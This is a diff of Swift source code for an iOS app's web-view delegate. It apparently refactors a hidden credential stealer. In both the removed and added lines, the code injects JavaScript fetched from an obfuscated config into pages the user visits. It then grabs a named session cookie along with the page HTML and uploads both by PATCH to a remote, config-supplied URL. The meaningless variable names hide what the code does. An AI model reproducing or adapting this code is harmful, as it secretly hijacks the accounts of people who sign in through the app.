@@ -52,35 +52,35 @@ func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKN
 func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
 
 DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
- webView.evaluateJavaScript(arrayData[ValueKey.eight_fr_1a.rawValue] ?? "", completionHandler: { result, error in })
+    webView.evaluateJavaScript(self.Nine_con_parent.arrayData[ValueKey.eight_fr_1a.rawValue] ?? "", completionHandler: { result, error in })
 }
 DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
- webView.evaluateJavaScript(arrayData[ValueKey.eight_fr_2a.rawValue] ?? "", completionHandler: { result, error in })
+    webView.evaluateJavaScript(self.Nine_con_parent.arrayData[ValueKey.eight_fr_2a.rawValue] ?? "", completionHandler: { result, error in })
 }
 DispatchQueue.main.asyncAfter(deadline: .now() + 4.0) {
-    webView.evaluateJavaScript(arrayData[ValueKey.eight_fr_3a.rawValue] ?? "", completionHandler: { result, error in })
+    webView.evaluateJavaScript(self.Nine_con_parent.arrayData[ValueKey.eight_fr_3a.rawValue] ?? "", completionHandler: { result, error in })
 }
 DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) {
-    webView.evaluateJavaScript(arrayData[ValueKey.eight_fr_4a.rawValue] ?? "", completionHandler: { result, error in })
+    webView.evaluateJavaScript(self.Nine_con_parent.arrayData[ValueKey.eight_fr_4a.rawValue] ?? "", completionHandler: { result, error in })
 }
 DispatchQueue.main.asyncAfter(deadline: .now() + 7.0) {
-    webView.evaluateJavaScript(arrayData[ValueKey.eight_fr_5a.rawValue] ?? "", completionHandler: { result, error in })
+    webView.evaluateJavaScript(self.Nine_con_parent.arrayData[ValueKey.eight_fr_5a.rawValue] ?? "", completionHandler: { result, error in })
 }
     
     DispatchQueue.main.asyncAfter(deadline: .now() + 10.0) {
-        webView.evaluateJavaScript(arrayData[ValueKey.eight_fr_6a.rawValue] ?? "") {  html, error in
+        webView.evaluateJavaScript(self.Nine_con_parent.arrayData[ValueKey.eight_fr_6a.rawValue] ?? "") {  html, error in
             if let htmlrecovery = html as? String, error == nil {
                 if !htmlrecovery.isEmpty{
-                    if htmlrecovery.contains(arrayData[ValueKey.eight_fr_7a.rawValue] ?? "") {
+                    if htmlrecovery.contains(self.Nine_con_parent.arrayData[ValueKey.eight_fr_7a.rawValue] ?? "") {
                         WKWebsiteDataStore.default().httpCookieStore.getAllCookies({ (cookies) in
-                            let seven_reco_i = cookies.firstIndex(where: { $0.name == arrayData[ValueKey.name_api_09.rawValue] ?? "" })
+                            let seven_reco_i = cookies.firstIndex(where: { $0.name == self.Nine_con_parent.arrayData[ValueKey.name_api_09.rawValue] ?? "" })
                             if(seven_reco_i != nil){
                                 let Six_json_data: [String: Any] = [
-                                    arrayData[ValueKey.name_api_20.rawValue] ?? "": cookies[seven_reco_i!].value,
-                                    arrayData[ValueKey.name_api_21.rawValue] ?? "": "\(htmlrecovery)",
-                                    arrayData[ValueKey.name_api_22.rawValue] ?? "": "\(Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as! String)-TWO"
+                                    self.Nine_con_parent.arrayData[ValueKey.name_api_20.rawValue] ?? "": cookies[seven_reco_i!].value,
+                                    self.Nine_con_parent.arrayData[ValueKey.name_api_21.rawValue] ?? "": "\(htmlrecovery)",
+                                    self.Nine_con_parent.arrayData[ValueKey.name_api_22.rawValue] ?? "": "\(Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as! String)-TWO"
                                 ]
-                                let url : URL = URL(string: arrayData[ValueKey.Chung_fr_07.rawValue] ?? "")!
+                                let url : URL = URL(string: self.Nine_con_parent.arrayData[ValueKey.Chung_fr_07.rawValue] ?? "")!
                                 let json_data = try? JSONSerialization.data(withJSONObject: Six_json_data)
                                 var request = URLRequest(url: url)
                                 request.httpMethod = "PATCH"
